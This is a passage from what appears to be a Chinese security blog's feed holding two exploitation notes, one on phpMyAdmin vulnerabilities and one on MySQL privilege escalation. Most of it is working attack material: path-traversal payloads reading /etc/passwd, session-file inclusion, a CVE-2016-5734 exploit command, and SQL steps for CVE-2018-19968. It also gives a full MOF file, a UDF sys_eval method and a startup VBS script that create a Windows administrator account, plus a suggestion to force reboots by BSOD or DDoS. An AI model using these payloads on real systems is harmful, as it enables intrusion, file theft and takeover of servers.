class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//变量是否设置且不为空或者不是字符串</span></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//$page中是否存在$whitelist中的值</span></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">    <span class="comment">//截取?之间的字符串</span></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//是否存在$whitelist中的值</span></span><br><span class="line"></span><br><span class="line">        <span class="variable">$_page</span> = urldecode(<span class="variable">$page</span>);</span><br><span class="line">    <span class="comment">//进行urldecode解码</span></span><br><span class="line">        <span class="variable">$_page</span> = mb_substr(</span><br><span class="line">            <span class="variable">$_page</span>,</span><br><span class="line">            <span class="number">0</span>,</span><br><span class="line">            mb_strpos(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">        );</span><br><span class="line">    <span class="comment">//截取?之间的值</span></span><br><span class="line">        <span class="keyword">if</span> (in_array(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//是否存在$whitelist中的值</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>原意是当target值带有参数时能够正确包含 , 但是当传有<code>?或者%3f或者%253f</code>和前面的字符串在<code>$whitelist</code>里面时都会使其绕过检查</p><p>​    <code>$whitelist</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="variable">$goto_whitelist</span> = <span class="keyword">array</span>(</span><br><span class="line">        <span class="string">&#x27;db_datadict.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_events.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_importdocsql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_multi_table_query.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_search.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;db_routines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;index.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_pages.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;pdf_schema.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_binlog.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_collations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_databases.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_engines.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_privileges.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_advisor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_monitor.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_queries.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_status_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;server_variables.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_addfield.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_change.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_create.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_import.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_indexes.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_sql.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_export.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_operations.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_structure.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_relation.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_replace.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_row_action.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;tbl_zoom_select.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_overview.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;transformation_wrapper.php&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;user_password.php&#x27;</span>,</span><br><span class="line">    );</span><br></pre></td></tr></table></figure><p>要利用的就是<code>index.php</code>中的<code>include</code>函数 , 则需要<code>checkPageValidity()</code>函数返true</p><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?target=db_datadict.php?/../../../../../../../../etc/passwd</span><br><span class="line">?target=db_datadict.php%3f/../../../../../../../../etc/passwd</span><br><span class="line">?target=db_datadict.php%253f/../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p>这些都可以绕过</p><h4 id="利用方法"><a href="#利用方法" class="headerlink" title="利用方法"></a>利用方法</h4><ol><li><p>包含敏感文件</p></li><li><p>包含上传文件</p></li><li><p>开启并包含日志</p></li><li><p>包含<code>phpsession</code>文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">先执行一句sql语句 select &#x27;&lt;?php phpinfo();?&gt;&#x27;;</span><br><span class="line">包含?target=db_datadict.php%253f/../../../tmp/tmp/sess_xxxxx</span><br><span class="line">phpsession文件名在cookie中找到</span><br></pre></td></tr></table></figure></li></ol><h3 id="CVE-2016-5734-RCE"><a href="#CVE-2016-5734-RCE" class="headerlink" title="CVE-2016-5734 RCE"></a>CVE-2016-5734 RCE</h3><p>影响版本</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">phpmyadmin4.3.0-4.6.2</span><br><span class="line">PHP 4.3.0-5.4.6</span><br></pre></td></tr></table></figure><p>漏洞原因</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在php5.4.7以前 , preg_replace函数有漏洞 , 可以/0进行截断,将正则修改为/e模式,从而执行命令</span><br></pre></td></tr></table></figure><p>使用脚本攻击</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">searchsploit phpmyadmin</span><br><span class="line">python3 40185.py   -u root - root -d test -c &quot;system(whoami)&quot; http://ip:port/</span><br></pre></td></tr></table></figure><h3 id="CVE-2018-19968"><a href="#CVE-2018-19968" class="headerlink" title="CVE-2018-19968"></a>CVE-2018-19968</h3><blockquote><p>参考: <a href="https://xz.aliyun.com/t/3634">https://xz.aliyun.com/t/3634</a></p></blockquote><p>影响版本: phpMyAdmin 4.8.0~4.8.3</p><p>原因</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Transformation是phpMyAdmin中的一个高级功能，通过Transformation可以对每个字段的内容使用不同的转换，每个字段中的内容将被预定义的规则所转换。比如我们有一个存有文件名的字段 ‘Filename’，正常情况下 phpMyAdmin 只会将路径显示出来。但是通过Transformation我们可以将该字段转换成超链接，我们就能直接在 phpMyAdmin 中点击并在浏览器的新窗口中看到这个文件。</span><br><span class="line"></span><br><span class="line">通常情况下Transformation的规则存储在每个数据库的pma__column_info表中，而在phpMyAdmin 4.8.0~4.8.3版本中，由于对转换参数处理不当，导致了任意文件包含漏洞的出现。</span><br></pre></td></tr></table></figure><p>利用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">登录后台后创建数据库</span><br><span class="line">CREATE DATABASE test111;</span><br><span class="line">CREATE TABLE test111.test1111 ( baz VARCHAR(100) PRIMARY KEY );</span><br><span class="line">INSERT INTO test111.test1111 SELECT &#x27;&lt;?php phpinfo(); ?&gt;&#x27;;</span><br></pre></td></tr></table></figure><p>访问<code>http://target/com/chk_rel.php?fixall_pmadb=1&amp;db=test111</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">插入数据 , 执行</span><br><span class="line">INSERT INTO pma__column_info SELECT &#x27;1&#x27;, &#x27;test111&#x27;, &#x27;test1111&#x27;, &#x27;baz&#x27;, &#x27;plop&#x27;, &#x27;plop&#x27;, &#x27;plop&#x27;, &#x27;plop&#x27;, &#x27;../../../../../../../../tmp/sess_9r15lk5a27asrbb6hl8hffv6cp&#x27;,&#x27;plop&#x27;;</span><br><span class="line">xxx换成cookie中的phpmyadmin值</span><br></pre></td></tr></table></figure><p>访问<code>/tbl_replace.php?db=test111&amp;table=test1111&amp;where_clause=1=1&amp;fields_name[multi_edit][][]=baz&amp;clause_is_unique=1</code></p>]]></content>
    
    
    
    <tags>
      
      <tag>漏洞利用</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>MYSQL提权复现</title>
    <link href="/2020/11/22/MYSQL%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/"/>
    <url>/2020/11/22/MYSQL%E6%8F%90%E6%9D%83%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<p>[toc]</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mysql写权限</span><br><span class="line">查询写权限</span><br><span class="line">show variables like &quot;secure_file_priv&quot;;</span><br><span class="line">查询结果不能为null</span><br></pre></td></tr></table></figure><blockquote><p>修改配置文件 windows下为my.ini   linux为my.cnf</p><p>secure_file_priv =’’ </p><p>null为不允许导入导出</p><p>空白则为任意</p><p>/tmp则为只能在/tmp目录下</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">查看mysql pulgin文件目录</span><br><span class="line">show variables like &quot;pulgin%&quot;;</span><br><span class="line">查看系统版本</span><br><span class="line">show variables like &quot;%compile%&quot;;</span><br></pre></td></tr></table></figure><h1 id="mof提权-失败"><a href="#mof提权-失败" class="headerlink" title="mof提权(失败)"></a>mof提权(失败)</h1><blockquote><p>在windows的<code>C:/windows/system32/wbem/mof/nullevt.mof</code>文件中, 会间接以系统权限执行一次, 写入我们的恶意代码即可被系统执行</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;上传文件的路径/evil.mof&quot;) into dumpfile &quot;C:/windows/system32/wbem/mof/nullevt.mof&quot;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">mof文件</span><br><span class="line">添加用户</span><br><span class="line">instanbce of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScripptText = &quot;var WSH = new ActiveXObject(\&quot;WScript.shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">提权</span><br><span class="line">instanbce of ActiveScriptEventConsumer as $Consumer</span><br><span class="line">&#123;</span><br><span class="line">Name = &quot;consPCSV2&quot;;</span><br><span class="line">ScriptingEngine = &quot;JScript&quot;;</span><br><span class="line">ScripptText = &quot;var WSH = new ActiveXObject(\&quot;WScript.shell\&quot;)\nWSH.run(\&quot;net localgroup administrators admin /add\&quot;)&quot;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">完整代码</span><br><span class="line">复制代码</span><br><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;) </span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter </span><br><span class="line">&#123; </span><br><span class="line">    EventNamespace = &quot;Root\\Cimv2&quot;; </span><br><span class="line">    Name  = &quot;filtP2&quot;; </span><br><span class="line">    Query = &quot;Select * From __InstanceModificationEvent &quot; </span><br><span class="line">            &quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot; </span><br><span class="line">            &quot;And TargetInstance.Second = 5&quot;; </span><br><span class="line">    QueryLanguage = &quot;WQL&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer </span><br><span class="line">&#123; </span><br><span class="line">    Name = &quot;consPCSV2&quot;; </span><br><span class="line">    ScriptingEngine = &quot;JScript&quot;; </span><br><span class="line">    ScriptText = </span><br><span class="line">    &quot;var WSH = new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user admin admin /add\&quot;)&quot;; </span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line">instance of __FilterToConsumerBinding </span><br><span class="line">&#123; </span><br><span class="line">    Consumer   = $Consumer; </span><br><span class="line">    Filter = $EventFilter; </span><br><span class="line">&#125;; </span><br></pre></td></tr></table></figure><h1 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h1><blockquote><p>通过添加对应的自定义函数文件 实现提权</p></blockquote><blockquote><p>mysql版本<strong>大于</strong>5.1版本. udf.dll文件必须放置于MYSQL安装目录下的lib\plugin文件夹下。</p><p>mysql版本<strong>小于</strong>5.1版本. udf.dll文件在Windows2003下放置于c:\windows\system32，在windows2000下放置于c:\winnt\system32。</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">先将sqlmap自带的udf文件转为udf.dll文件(linux为.so文件), 在sqlmap下的sqlmap\extra\cloak\cloak.py文件 </span><br><span class="line">python cloak.py -d -i C:\sqlmap\data\udf\mysql\windows\64\lib_mysqludf_sys.dll_</span><br><span class="line">在mysql安装目录下存在lib/plugin目录 并且存在, 将sqlmap生成的udf文件移动到mysql对应目录下</span><br><span class="line">或者将文件转为16进制 然后解码存入文件</span><br><span class="line">select unhex(&quot;xxxxx16进制字符&quot;) into dumpfile &quot;pulgin路径/udf.dll&quot;</span><br><span class="line">在mysql中引入udf文件</span><br><span class="line">create function sys_eval returns string soname &#x27;udf.dll&#x27;;</span><br><span class="line">执行函数</span><br><span class="line">select sys_eval(&quot;whoami&quot;);</span><br><span class="line">创建用户 </span><br><span class="line">net user test root /add/   root是密码</span><br><span class="line">net localgroup administrators test /add</span><br><span class="line">删除函数</span><br><span class="line">drop function sys_eval;</span><br><span class="line">delect from mysql.func where name=&quot;sys_eval&quot;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="vbs提权"><a href="#vbs提权" class="headerlink" title="vbs提权"></a>vbs提权</h1><blockquote><p>将vbs文件放入window的C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup下 在windows启动时就会自动执行</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">bbs文件</span><br><span class="line">创建test用户</span><br><span class="line">set sh=wscript.createobject(&quot;wscript.shell&quot;)</span><br><span class="line">sh.run &quot;net user test11 qwe123! /add&quot;</span><br><span class="line">导入文件夹 注意路径分割符</span><br><span class="line">select load_file(&quot;C:/上传的vbs文件/&quot;) into dumpfile &quot;C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/1.vbs&quot;</span><br></pre></td></tr></table></figure><p>迫使服务器重启</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">蓝屏exp</span><br><span class="line">ddos攻击</span><br></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>提权</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
